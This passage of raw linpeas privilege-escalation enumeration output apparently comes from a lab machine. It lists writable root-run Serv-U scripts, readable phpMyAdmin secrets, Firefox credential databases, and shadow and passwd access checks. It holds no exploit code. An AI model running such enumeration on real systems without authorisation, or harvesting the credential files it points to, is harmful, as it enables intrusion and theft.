2018 01-locale-fix.sh\r-rw-r--r-- 1 root root 825 Jun 5 2019 apps-bin-path.sh\r-rw-r--r-- 1 root root 664 Apr 2 2018 bash_completion.sh\r-rw-r--r-- 1 root root 1003 Dec 29 2015 cedilla-portuguese.sh\r-rw-r--r-- 1 root root 652 Apr 3 2019 input-method-config.sh\r-rw-r--r-- 1 root root 1941 Jul 16 2018 vte-2.91.sh\r-rw-r--r-- 1 root root 954 May 2 2018 xdg_dirs_desktop_session.sh\r╔══════════╣ Permissions in init, init.d, systemd, and rc.d\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d ═╣ Hashes inside passwd file? ........... No\r═╣ Writable passwd file? ................ No ═╣ Credentials in fstab/mtab? ........... No ═╣ Can I read shadow files? ............. No ═╣ Can I read shadow plists? ............ No ═╣ Can I write shadow plists? ........... No ═╣ Can I read opasswd file? ............. No ═╣ Can I write in network-scripts? ...... No ═╣ Can I read root folder? .............. No ╔══════════╣ Searching root files in home dirs (limit 30)\r/home/ /home/love/local.txt\r/root/\r/var/www/html/robots.txt\r╔══════════╣ Searching folders owned by me containing others files on it (limit 100)\r-rw-r--r-- 1 root root 33 May 15 19:19 /home/love/local.txt ╔══════════╣ Readable files belonging to root and readable by me but not world readable\r-rw-r----- 1 root dip 1093 Aug 6 2019 /etc/ppp/peers/provider -rw-r----- 1 root www-data 519 Apr 2 2020 /etc/phpmyadmin/config-db.php\r-rw-r----- 1 root www-data 8 Apr 2 2020 /etc/phpmyadmin/htpasswd.setup\r-rw-r----- 1 root dip 656 Aug 6 2019 /etc/chatscripts/provider\r-rw-r----- 1 root www-data 0 Apr 2 2020 /var/lib/phpmyadmin/config.inc.php\r-rw-r----- 1 root www-data 68 Apr 2 2020 /var/lib/phpmyadmin/blowfish_secret.inc.php\r-rw-r----- 1 root adm 2150 May 26 2020 /var/log/apport.log.1\r-rw-r----- 1 root adm 27599 May 23 2020 /var/log/apt/term.log.3.gz\r-rw-r----- 1 root adm 1263 Jun 16 2022 /var/log/apt/term.log.1.gz\r-rw-r----- 1 root adm 0 Feb 16 01:21 /var/log/apt/term.log\r-rw-r----- 1 root adm 7630 Oct 21 2019 /var/log/apt/term.log.4.gz\r-rw-r----- 1 root adm 2964 May 27 2020 /var/log/apt/term.log.2.gz\r-rw-r----- 1 root adm 0 Jun 16 2022 /var/log/apport.log\r-rw-r----- 1 root adm 15259886 May 15 20:54 /var/log/apache2/access.log\r-rw-r----- 1 root adm 4955158 Apr 9 2020 /var/log/apache2/access.log.3.gz\r-rw-r----- 1 root adm 8539 May 27 2020 /var/log/apache2/access.log.2.gz\r-rw-r----- 1 root adm 570 Feb 16 01:21 /var/log/apache2/error.log.2.gz\r-rw-r----- 1 root adm 880 Apr 8 2020 /var/log/apache2/error.log.6.gz\r-rw-r----- 1 root adm 3091432 Apr 3 2020 /var/log/apache2/error.log.7.gz\r-rw-r----- 1 root adm 2321 May 15 20:50 /var/log/apache2/error.log\r-rw-r----- 1 root adm 909 May 15 19:21 /var/log/apache2/error.log.1\r-rw-r----- 1 root adm 49124 May 15 19:21 /var/log/apache2/access.log.1\r-rw-r----- 1 root adm 3820 Jun 16 2022 /var/log/apache2/error.log.3.gz\r-rw-r----- 1 root adm 3283757 Apr 3 2020 /var/log/apache2/access.log.6.gz\r-rw-r----- 1 root adm 856 Apr 9 2020 /var/log/apache2/error.log.5.gz\r-rw-r----- 1 root adm 2414 Apr 8 2020 /var/log/apache2/access.log.4.gz\r-rw-r----- 1 root adm 5962292 May 26 2020 /var/log/apache2/error.log.4.gz\r-rw-r----- 1 root adm 3392 Apr 3 2020 /var/log/apache2/access.log.5.gz\r-rw-r----- 1 root adm 184 May 27 2020 /var/log/cups/error_log.1\r-rw-r----- 1 root adm 537 Jun 16 2022 /var/log/cups/access_log.3.gz\r-rw-r----- 1 root adm 224 May 15 19:21 /var/log/cups/access_log\r-rw-r----- 1 root adm 778 May 15 19:21 /var/log/cups/access_log.1\r-rw-r----- 1 root adm 126 Oct 21 2019 /var/log/cups/error_log.2.gz\r-rw-r----- 1 root adm 258 Apr 8 2020 /var/log/cups/access_log.6.gz\r-rw-r----- 1 root adm 516 May 26 2020 /var/log/cups/access_log.4.gz\r-rw-r----- 1 root adm 0 Jun 16 2022 /var/log/cups/error_log\r-rw-r----- 1 root adm 297 Apr 9 2020 /var/log/cups/access_log.5.gz\r-rw-r----- 1 root adm 523 Apr 3 2020 /var/log/cups/access_log.7.gz\r-rw-r----- 1 root adm 389 Feb 16 01:21 /var/log/cups/access_log.2.gz\r-rw-r----- 1 root adm 207 Apr 8 2020 /var/log/apport.log.2.gz\r-rw-r----- 1 root dip 656 Oct 1 2019 /snap/core/7917/etc/chatscripts/provider\r-rw-r----- 1 root dip 1093 Oct 1 2019 /snap/core/7917/etc/ppp/peers/provider\r-rw-r----- 1 root adm 31 Oct 1 2019 /snap/core/7917/var/log/dmesg\r-rw-r----- 1 root adm 31 Oct 1 2019 /snap/core/7917/var/log/fsck/checkfs\r-rw-r----- 1 root adm 31 Oct 1 2019 /snap/core/7917/var/log/fsck/checkroot\r-rw-r----- 1 root dip 656 Jun 21 2019 /snap/core/7270/etc/chatscripts/provider\r-rw-r----- 1 root dip 1093 Jun 21 2019 /snap/core/7270/etc/ppp/peers/provider\r-rw-r----- 1 root adm 31 Jun 21 2019 /snap/core/7270/var/log/dmesg\r-rw-r----- 1 root adm 31 Jun 21 2019 /snap/core/7270/var/log/fsck/checkfs\r-rw-r----- 1 root adm 31 Jun 21 2019 /snap/core/7270/var/log/fsck/checkroot\r╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files /dev/mqueue /dev/shm\r/home/love\r/run/lock\r/run/Serv-U-Running.pid\r/run/user/1000\r/run/user/1000/gnupg\r/run/user/1000/systemd\r/snap/core18/1066/run/lock\r/snap/core18/1066/tmp\r/snap/core18/1066/var/tmp\r/snap/core18/1223/run/lock\r/snap/core18/1223/tmp\r/snap/core18/1223/var/tmp\r/snap/core/7270/run/lock\r/snap/core/7270/tmp\r/snap/core/7270/var/tmp\r/snap/core/7917/run/lock\r/snap/core/7917/tmp\r/snap/core/7917/var/tmp\r/tmp\r/tmp/.font-unix\r/tmp/.ICE-unix\r/tmp/.Test-unix\r/tmp/.X11-unix\r/tmp/.XIM-unix\r/usr/local/download/SU-FTP-Server-Linux-64bit-v15.1.6\r/usr/local/Serv-U/Scripts/runasroot.sh\r/usr/local/Serv-U/Serv-U.Archive\r/usr/local/Serv-U/Serv-U.Archive.Backup\r/usr/local/Serv-U/Serv-U-StartupLog.txt\r/var/crash\r/var/lib/php/sessions\r/var/metrics\r/var/tmp\r/var/tmp/Serv-U-Engine-Tray-SharedMemory\r/var/www/html\r/var/www/html/election\r/var/www/html/election/card.php\r/var/www/html/election/.htaccess\r/var/www/html/election/license.tp\r/var/www/html/index.html\r/var/www/html/phpinfo.php\r/var/www/html/robots.txt\r╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files Group love: /home/love Group www-data:\r/var/tmp /var/mail\r/var/local\r/var/www\r/var/www/.local\r/var/www/.local/share\r/var/www/.local/share/nano\r/var/www/.bash_history\r/var/www/html\r/var/www/html/phpinfo.php\r/var/www/html/index.html\r/var/www/html/election\r/var/www/html/election/.htaccess\r/var/www/html/election/license.tp\r/var/lib/ucf/cache/:etc:papersize\r/var/lib/ubiquity\r/var/lib/ubiquity/os-prober-cache\r/var/lib/php/sessions\r/var/lib/apt/cdroms.list\r/var/log/installer\r/var/log/installer/initial-status.gz\r/var/log/hp/tmp\r/var/spool/cron/crontabs\rGroup lpadmin:\r/usr/share/ppd/custom ╔═════════════════════════╗\r════════════════════════════╣ Other Interesting Files ╠════════════════════════════ ╚═════════════════════════╝ ╔══════════╣ .sh files in path\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path /usr/bin/gettext.sh /usr/bin/amuFormat.sh\r╔══════════╣ Executable files potentially added by user (limit 70)\r2023-02-18+04:12:23.7461051040 /etc/kernel/prerm.d/vboxadd 2023-02-18+04:12:23.7461051040 /etc/kernel/postinst.d/vboxadd\r2022-06-16+20:13:10.1559852410 /home/love/.config/pulse/75035b71b2ca48c6967bcbb5e0ab236e-default-source\r2022-06-16+20:13:10.1559852410 /home/love/.config/pulse/75035b71b2ca48c6967bcbb5e0ab236e-default-sink\r2022-06-16+20:13:03.9408789230 /home/love/.ICEauthority\r2020-05-27+15:52:17.2995985250 /var/www/.bash_history\r2020-05-27+15:05:59.3250151920 /home/love/.local/share/gnome-shell/application_state\r2020-05-26+16:06:42.7867809120 /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite-wal\r2020-05-26+16:06:39.6252007810 /home/love/.mozilla/firefox/y55nwd4d.default-release/prefs.js\r2020-05-26+16:04:38.1805036690 /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite\r2020-05-26+16:04:38.0244256650 /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite\r2020-05-26+16:04:37.5561916440 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/social-tracking-protection-facebook-digest256.vlpset\r2020-05-26+16:04:37.3120696330 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/social-tracking-protection-facebook-digest256.sbstore\r2020-05-26+16:04:36.7998136110 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/base-cryptomining-track-digest256.vlpset\r2020-05-26+16:04:36.6197236030 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/base-cryptomining-track-digest256.sbstore\r2020-05-26+16:04:36.2635455900 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/analytics-track-digest256.vlpset\r2020-05-26+16:04:36.0874575800 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/analytics-track-digest256.sbstore\r2020-05-26+16:04:35.7512895660 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/social-tracking-protection-linkedin-digest256.vlpset\r2020-05-26+16:04:35.5591935580 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/social-tracking-protection-linkedin-digest256.sbstore\r2020-05-26+16:04:35.3871075530 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/ads-track-digest256.vlpset\r2020-05-26+16:04:35.1790035420 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/ads-track-digest256.sbstore\r2020-05-26+16:04:35.0229255360 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/social-track-digest256.vlpset\r2020-05-26+16:04:34.8748515300 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/social-track-digest256.sbstore\r2020-05-26+16:04:34.6707495220 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/social-tracking-protection-twitter-digest256.vlpset\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/social-tracking-protection-twitter-digest256.sbstore\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/mozplugin-block-digest256.vlpset\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/mozplugin-block-digest256.sbstore\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google-trackwhite-digest256.sbstore\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-unwanted-proto.vlpset\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-unwanted-proto.metadata\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-phish-proto.vlpset\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-malware-proto.vlpset\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-malware-proto.metadata\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-downloadwhite-proto.vlpset\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-downloadwhite-proto.metadata\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-badbinurl-proto.vlpset\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-badbinurl-proto.metadata\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/except-flashsubdoc-digest256.sbstore\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/content-track-digest256.vlpset\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/block-flashsubdoc-digest256.vlpset\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/block-flashsubdoc-digest256.sbstore\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/block-flash-digest256.vlpset\r2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/base-fingerprinting-track-digest256.sbstore\r2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/mozstd-trackwhite-digest256.vlpset\r2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/mozstd-trackwhite-digest256.sbstore\r2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google-trackwhite-digest256.vlpset\r2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-phish-proto.metadata\r2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/except-flashsubdoc-digest256.vlpset\r2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/except-flash-digest256.vlpset\r2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/except-flash-digest256.sbstore\r2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/except-flashallow-digest256.sbstore\r2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/block-flash-digest256.sbstore\r2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/base-fingerprinting-track-digest256.vlpset\r2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/allow-flashallow-digest256.vlpset\r2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/allow-flashallow-digest256.sbstore\r2020-05-26+16:04:34.3465875060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/except-flashallow-digest256.vlpset\r2020-05-26+16:04:34.3465875060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/content-track-digest256.sbstore\r2020-05-26+16:04:32.6537414310 /home/love/.mozilla/firefox/y55nwd4d.default-release/favicons.sqlite-wal\r2020-05-26+16:04:32.5656974270 /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite\r2020-05-26+16:04:31.9133713990 /home/love/.mozilla/firefox/y55nwd4d.default-release/cookies.sqlite-wal\r2020-05-26+16:04:26.4586451710 /home/love/.mozilla/firefox/y55nwd4d.default-release/protections.sqlite\r2020-05-26+16:04:16.6377367580 /home/love/.mozilla/firefox/y55nwd4d.default-release/storage.sqlite\r2020-05-26+16:04:14.1204786520 /home/love/.mozilla/firefox/y55nwd4d.default-release/cookies.sqlite\r2020-05-26+16:04:10.6347364960 /home/love/.mozilla/firefox/y55nwd4d.default-release/compatibility.ini\r2020-05-26+16:04:10.5346864910 /home/love/.mozilla/firefox/y55nwd4d.default-release/.parentlock\r2020-05-26+16:01:03.9254206540 /etc/init.d/Serv-U\r2020-05-26+16:00:55.1970582800 /usr/local/Serv-U/uninstall\r2020-05-26+15:49:57.7441859260 /home/love/.local/share/app-info/xmls/extensions-web.xml\r2020-05-23+15:28:32.8368018790 /home/love/.mozilla/firefox/y55nwd4d.default-release/SiteSecurityServiceState.txt\r2020-05-23+15:25:02.1887939500 /home/love/.mozilla/firefox/y55nwd4d.default-release/places.sqlite-wal\r╔══════════╣ Unexpected in /opt (usually empty)\rtotal 12 drwxr-xr-x 3 root root 4096 Oct 20 2019 .\rdrwxr-xr-x 25 root root 4096 Jun 16 2022 ..\rdrwxr-xr-x 9 root root 4096 Oct 20 2019 VBoxGuestAdditions-6.0.8\r╔══════════╣ Unexpected in root\r/vmlinuz.old /initrd.img.old\r/vmlinuz\r/swapfile\r/initrd.img\r╔══════════╣ Modified interesting files in the last 5mins (limit 100)\r/var/tmp/Serv-U-Engine-Tray-SharedMemory /var/log/apache2/access.log\r/var/log/apache2/error.log\r/var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/user-1000.journal\r/var/log/journal/75035b71b2ca48c6967bcbb5e0ab236e/system.journal\r╔══════════╣ Writable log files (logrotten) (limit 50)\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation logrotate 3.15.1 Default mail command: /bin/mail\rDefault compress command: /bin/gzip\rDefault uncompress command: /bin/gunzip\rDefault compress extension: .gz\rDefault state file path: /var/lib/logrotate.status\rACL support: no\rSELinux support: no\r./linpeas.sh: 5138: [: ImPOsSiBleeElastWlogFolder: unexpected operator\r./linpeas.sh: 5138: [: ImPOsSiBleeElastWlogFolder: unexpected operator\rWritable: /home/love/.local/share/gvfs-metadata/root-7bedd492.log\r╔══════════╣ Files inside /home/love (limit 20)\rtotal 916 drwsrwxrwx 18 love love 4096 May 15 20:51 .\rdrwxr-xr-x 3 root root 4096 Apr 9 2020 ..\r-rw------- 1 love love 92 Jun 16 2022 .bash_history\rdrwxrwxrwx 15 love love 4096 Apr 8 2020 .cache\rdrwxrwxrwx 14 love love 4096 May 26 2020 .config\rdrwxrwxrwx 3 love love 4096 Oct 20 2019 .dbus\rdrwxrwxrwx 2 love love 4096 Apr 9 2020 Desktop\rdrwxrwxrwx 2 love love 4096 Apr 8 2020 Documents\rdrwxrwxrwx 2 love love 4096 Oct 20 2019 Downloads\rdrwxrwxrwx 3 love love 4096 Oct 20 2019 .gnupg\rdrwxrwxrwx 2 love love 4096 Oct 20 2019 .gvfs\r-rwxrwxrwx 1 love love 10534 Jun 16 2022 .ICEauthority\r-rwxrwxr-x 1 love love 830030 May 1 11:14 linpeas.sh\rdrwxrwxrwx 3 love love 4096 Oct 20 2019 .local\r-rw-r--r-- 1 root root 33 May 15 19:19 local.txt\rdrwxrwxrwx 5 love love 4096 Apr 2 2020 .mozilla\rdrwxrwxrwx 2 love love 4096 Oct 20 2019 Music\rdrwxrwxrwx 2 love love 4096 Oct 21 2019 Pictures\r-rwxrwxrwx 1 love love 807 Oct 20 2019 .profile\rdrwxrwxrwx 2 love love 4096 Oct 20 2019 Public\r-rwxrwxrwx 1 love love 66 Oct 20 2019 .selected_editor\r-rw-rw-r-- 1 love love 83 May 26 2020 .Serv-U-Tray.conf\r╔══════════╣ Files inside others home (limit 20)\r/var/www/.bash_history /var/www/html/phpinfo.php\r/var/www/html/index.html\r/var/www/html/election/card.php\r/var/www/html/election/themes/shards/js/jquery-3.2.1.min.js\r/var/www/html/election/themes/shards/js/popper.min.js\r/var/www/html/election/themes/shards/js/jquery.cookie.js\r/var/www/html/election/themes/shards/js/bootstrap.min.js\r/var/www/html/election/themes/shards/js/moment.min.js\r/var/www/html/election/themes/shards/js/shards.min.js\r/var/www/html/election/themes/shards/js/bootstrap-notify.js\r/var/www/html/election/themes/shards/js/eLection.js\r/var/www/html/election/themes/shards/css/shards.min.css\r/var/www/html/election/themes/shards/css/reset.min.css\r/var/www/html/election/themes/shards/css/font-awesome.min.css\r/var/www/html/election/themes/shards/css/shards.tripath.css\r/var/www/html/election/themes/shards/css/animate.css\r/var/www/html/election/themes/shards/css/material-icons/material-icons.woff2\r/var/www/html/election/themes/shards/css/material-icons/material-icons.css\r/var/www/html/election/themes/shards/css/bootstrap.min.css\r╔══════════╣ Searching installed mail applications\r╔══════════╣ Mails (limit 50)\r╔══════════╣ Backup files (limited 100)\r-rwxr-xr-x 1 root root 1086 Sep 16 2019 /usr/src/linux-headers-5.3.0-46/tools/testing/selftests/net/tcp_fastopen_backup_key.sh\r-rw-r--r-- 1 root root 235840 Mar 27 2020 /usr/src/linux-headers-5.3.0-45-generic/.config.old\r-rw-r--r-- 1 root root 0 Mar 27 2020 /usr/src/linux-headers-5.3.0-45-generic/include/config/net/team/mode/activebackup.h\r-rw-r--r-- 1 root root 0 Mar 27 2020 /usr/src/linux-headers-5.3.0-45-generic/include/config/wm831x/backup.h\r-rwxr-xr-x 1 root root 1086 Nov 25 2019 /usr/src/linux-hwe-5.4-headers-5.4.0-120/tools/testing/selftests/net/tcp_fastopen_backup_key.sh\r-rw-r--r-- 1 root root 237891 Jun 10 2022 /usr/src/linux-headers-5.4.0-120-generic/.config.old\r-rw-r--r-- 1 root root 0 Jun 10 2022 /usr/src/linux-headers-5.4.0-120-generic/include/config/net/team/mode/activebackup.h\r-rw-r--r-- 1 root root 0 Jun 10 2022 /usr/src/linux-headers-5.4.0-120-generic/include/config/wm831x/backup.h\r-rwxr-xr-x 1 root root 1086 Sep 16 2019 /usr/src/linux-headers-5.3.0-45/tools/testing/selftests/net/tcp_fastopen_backup_key.sh\r-rw-r--r-- 1 root root 235862 Mar 31 2020 /usr/src/linux-headers-5.3.0-46-generic/.config.old\r-rw-r--r-- 1 root root 0 Mar 31 2020 /usr/src/linux-headers-5.3.0-46-generic/include/config/net/team/mode/activebackup.h\r-rw-r--r-- 1 root root 0 Mar 31 2020 /usr/src/linux-headers-5.3.0-46-generic/include/config/wm831x/backup.h\r-rwxr-xr-x 1 root root 1086 Sep 16 2019 /usr/src/linux-headers-5.3.0-53/tools/testing/selftests/net/tcp_fastopen_backup_key.sh\r-rwxr-xr-x 1 root root 17152328 Jan 30 2020 /usr/bin/mariabackup\r-rwxr-xr-x 1 root root 41671 Jan 30 2020 /usr/bin/wsrep_sst_xtrabackup-v2\r-rwxr-xr-x 1 root root 37515 Jan 30 2020 /usr/bin/wsrep_sst_mariabackup\r-rwxr-xr-x 1 root root 21273 Jan 30 2020 /usr/bin/wsrep_sst_xtrabackup\r-rwxr-xr-x 1 root root 1513 Oct 20 2013 /usr/share/doc/libipc-system-simple-perl/examples/rsync-backup.pl\r-rw-r--r-- 1 root root 361345 Feb 2 2018 /usr/share/doc/manpages/Changes.old.gz\r-rw-r--r-- 1 root root 7867 Nov 7 2016 /usr/share/doc/telnet/README.telnet.old.gz\r-rw-r--r-- 1 root root 14552 Apr 8 2020 /usr/share/info/dir.old\r-rw-r--r-- 1 root root 357 Jan 30 2020 /usr/share/man/man1/wsrep_sst_xtrabackup-v2.1.gz\r-rw-r--r-- 1 root root 351 Jan 30 2020 /usr/share/man/man1/wsrep_sst_xtrabackup.1.gz\r-rw-r--r-- 1 root root 348 Jan 30 2020 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz\r-rw-r--r-- 1 root root 2543 Apr 13 2018 /usr/share/help-langpack/en_GB/evolution/backup-restore.page\r-rw-r--r-- 1 root root 974 Mar 17 2018 /usr/share/help-langpack/en_GB/org.gnome.DejaDup/backup-auto.page\r-rw-r--r-- 1 root root 755 Mar 17 2018 /usr/share/help-langpack/en_GB/org.gnome.DejaDup/backup-first.page\r-rw-r--r-- 1 root root 974 Mar 17 2018 /usr/share/help-langpack/en_AU/org.gnome.DejaDup/backup-auto.page\r-rw-r--r-- 1 root root 755 Mar 17 2018 /usr/share/help-langpack/en_AU/org.gnome.DejaDup/backup-first.page\r-rw-r--r-- 1 root root 1581 Dec 16 2017 /usr/share/help/C/seahorse/misc-key-backup.page\r-rw-r--r-- 1 root root 2505 Apr 16 2018 /usr/share/help/C/gnome-help/backup-what.page\r-rw-r--r-- 1 root root 1815 Apr 16 2018 /usr/share/help/C/gnome-help/backup-check.page\r-rw-r--r-- 1 root root 1999 Apr 16 2018 /usr/share/help/C/gnome-help/backup-frequency.page\r-rw-r--r-- 1 root root 1320 Apr 16 2018 /usr/share/help/C/gnome-help/backup-restore.page\r-rw-r--r-- 1 root root 3318 Apr 16 2018 /usr/share/help/C/gnome-help/backup-thinkabout.page\r-rw-r--r-- 1 root root 2268 Apr 16 2018 /usr/share/help/C/gnome-help/backup-where.page\r-rw-r--r-- 1 root root 2356 Apr 16 2018 /usr/share/help/C/gnome-help/backup-how.page\r-rw-r--r-- 1 root root 1262 Apr 16 2018 /usr/share/help/C/gnome-help/backup-why.page\r-rw-r--r-- 1 root root 35544 Mar 25 2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so\r-rw-r--r-- 1 root root 20021 Jun 16 2022 /var/log/Xorg.1.log.old\r-rw-r--r-- 1 www-data www-data 51867 Oct 21 2019 /var/log/Xorg.0.log.old\r-rw-r--r-- 1 love love 26737 May 27 2020 /home/love/.local/share/xorg/Xorg.1.log.old\r-rwxrwxrwx 1 love love 26754 Oct 20 2019 /home/love/.local/share/xorg/Xorg.0.log.old\r-rw-r--r-- 1 root root 8225 May 7 2020 /lib/modules/5.3.0-53-generic/kernel/drivers/net/team/team_mode_activebackup.ko\r-rw-r--r-- 1 root root 8225 May 7 2020 /lib/modules/5.3.0-53-generic/kernel/drivers/power/supply/wm831x_backup.ko\r-rw-r--r-- 1 root root 9073 Jun 10 2022 /lib/modules/5.4.0-120-generic/kernel/drivers/net/team/team_mode_activebackup.ko\r-rw-r--r-- 1 root root 9321 Jun 10 2022 /lib/modules/5.4.0-120-generic/kernel/drivers/power/supply/wm831x_backup.ko\r-rw-r--r-- 1 root root 8225 Mar 27 2020 /lib/modules/5.3.0-45-generic/kernel/drivers/net/team/team_mode_activebackup.ko\r-rw-r--r-- 1 root root 8225 Mar 27 2020 /lib/modules/5.3.0-45-generic/kernel/drivers/power/supply/wm831x_backup.ko\r-rw-r--r-- 1 root root 8225 Mar 31 2020 /lib/modules/5.3.0-46-generic/kernel/drivers/net/team/team_mode_activebackup.ko\r-rw-r--r-- 1 root root 8225 Mar 31 2020 /lib/modules/5.3.0-46-generic/kernel/drivers/power/supply/wm831x_backup.ko\r╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)\rFound /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/OfflineCache/index.sqlite: SQLite 3.x database, last written using SQLite version 3031001\rFound /home/love/.local/share/evolution/addressbook/system/contacts.db: SQLite 3.x database, last written using SQLite version 3022000\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/cert9.db: SQLite 3.x database, last written using SQLite version 3031001\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/content-prefs.sqlite: SQLite 3.x database, user version 4, last written using SQLite version 3031001\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/cookies.sqlite: SQLite 3.x database, user version 11, last written using SQLite version 3031001\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/favicons.sqlite: SQLite 3.x database, last written using SQLite version 3031001\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/formhistory.sqlite: SQLite 3.x database, user version 4, last written using SQLite version 3031001\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/key4.db: SQLite 3.x database, last written using SQLite version 3031001\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/permissions.sqlite: SQLite 3.x database, user version 11, last written using SQLite version 3031001\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/places.sqlite: SQLite 3.x database, user version 53, last written using SQLite version 3031001\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/protections.sqlite: SQLite 3.x database, user version 1, last written using SQLite version 3031001\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/default/https+++www.google.com/idb/548905059db.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/default/https+++www.serv-u.com/idb/3808187126SBWD_.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001 Found /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/default/moz-extension+++d53c4cd4-0510-4e77-8a00-5abe770f51a8^userContextId=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001\rFound /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3031001 Found 